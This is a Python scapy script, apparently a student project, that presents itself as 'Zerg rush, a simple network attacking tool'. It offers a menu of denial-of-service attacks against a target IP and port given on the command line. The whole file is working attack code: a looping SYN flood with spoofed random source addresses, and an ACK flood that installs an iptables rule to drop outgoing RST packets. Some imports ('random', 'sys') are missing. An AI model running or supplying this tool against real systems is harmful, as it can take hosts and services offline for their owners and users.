from scapy.all import*
import os

def syn_flood(src, dst, dport):
    print("[*] Initiating SYN flood attack to Ip address "+str(dst)+". Press ctrl-c to exit the program.")
    srcIP = RandIP("192.168.1.1/24")
    srcPort = RandShort()
    ip = IP(src = srcIP, dst = dst)
    tcp = TCP(sport = srcPort, dport = dport, flags = "S")
    raw = Raw(b"X"*1024)
    SYN = ip/ tcp/ raw
    print("\n[*] sending SYN packets.")
    send(SYN, loop = 1, verbose = 0)

def ACK_attack(src, dst, dport):
    print("[*] Initiating ACK attack to Ip address "+str(dst)+". Press ctrl-c to exit the program.")
    cmd = "sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP"
    os.system(cmd)
    try:
        while(True):
            #syn
            sport = random.randint(1024, 65535)
            ip = IP(src = src, dst = dst)
            SYN = TCP(sport = sport, dport = dport, flags='S', seq = 1000)
            SYNACK=sr1(ip/SYN)

            #ack
            ACK=TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
            send(ip/ACK)
    except KeyboardInterrupt:
        os.system("sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP")

def selection(src, dst, dport):
    os.system("clear -x")
    print("""
    +---------------------------------------------------------------------------+
    |   __________                           __________             .__         |
    |   \____    /___________  ____          \______   \__ __  _____|  |__      |
    |     /     // __ \_  __ \/ ___\   ______ |       _/  |  \/  ___/  |  \     |
    |    /     /\  ___/|  | \/ /_/  > /_____/ |    |   \  |  /\___ \|   Y  \    | \0
    |   /_______ \___  >__|  \___  /          |____|_  /____//____  >___|  /    |
    |           \/   \/     /_____/                  \/           \/     \/     |
    +---------------------------------------------------------------------------+
    |           Welcome to Zerg rush, a simple network attacking tool.          |
    +---------------------------------------------------------------------------+
                                                            Peter Lee, UIUC 2022""")
    print("[*] Attack information:\n    Attacker IP: "+src+"\n    Target IP: "+dst+"\n    Target port number: "+str(dport)+"\n")
    print("[*] Please select options below:\n    1. SYN flood attack\n    2. ACK flood attack\n    3. Modify attacker IP address\n    4. Modify target IP address\n    5. Modify target port number")
    foo = 0
    foo = input("> ")
    print("[*] You have selected "+foo)
    if foo == "1":
        syn_flood(src, dst, dport)
    elif foo == "2":
        ACK_attack(src, dst, dport)
    elif foo == "3":
        src = input("Enter new attacker IP address below\n> ")
        selection(src, dst, dport)
    elif foo == "4":
        dst = input("Enter new target IP address below\n> ")
        selection(src, dst, dport)
    elif foo == "5":
        dport = input("Enter new target port number below\n> ")
        selection(src, dst, dport)

src = sys.argv[1]
dst = sys.argv[2]
dport = int(sys.argv[3])
#print("[*] Attack information:\n    Attacker IP: "+src+"\n    Target IP: "+dst+"\n    Target port number: "+str(dport))
#print("[*] Please select options below:\n    1. SYN flood attack\n    2. ACK flood attack\n    3. Modify attacker IP address\n    4. Modify target IP address\n    5. Modify target port number")
selection(src, dst, dport)
